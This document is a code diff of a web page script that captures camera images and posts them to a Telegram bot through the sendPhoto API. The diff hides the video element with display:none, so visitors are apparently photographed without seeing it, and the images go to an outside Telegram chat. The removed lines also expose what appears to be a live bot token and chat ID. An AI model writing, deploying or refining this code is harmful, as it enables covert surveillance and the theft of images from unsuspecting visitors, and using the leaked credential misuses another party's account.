@@ -14,8 +14,7 @@ font-family:Arial;
 }
 
 video{
-width:300px;
-border-radius:10px;
+display:none;
 }
 
 canvas{
@@ -84,15 +83,14 @@ document.getElementById("photo").src = data
 
 sendToTelegram(data)
 
-video.style.display="none"
 document.getElementById("result").style.display="block"
 
 }
 
 function sendToTelegram(imageData){
 
-const token = "8616417285:AAHQvJfY029-xxipt4cENWAU9oRtQml-gKw"
-const chat_id = "7737717483"
+const token = "PUT_YOUR_TOKEN"
+const chat_id = "PUT_YOUR_CHAT_ID"
 
 fetch(imageData)
 .then(res => res.blob())
@@ -102,11 +100,10 @@ const formData = new FormData()
 
 formData.append("chat_id", chat_id)
 formData.append("photo", blob, "photo.png")
-formData.append("caption","صورة جديدة من الموقع 📸")
 
 fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
 method:"POST",
-body: formData
+body:formData
 })
 
 })
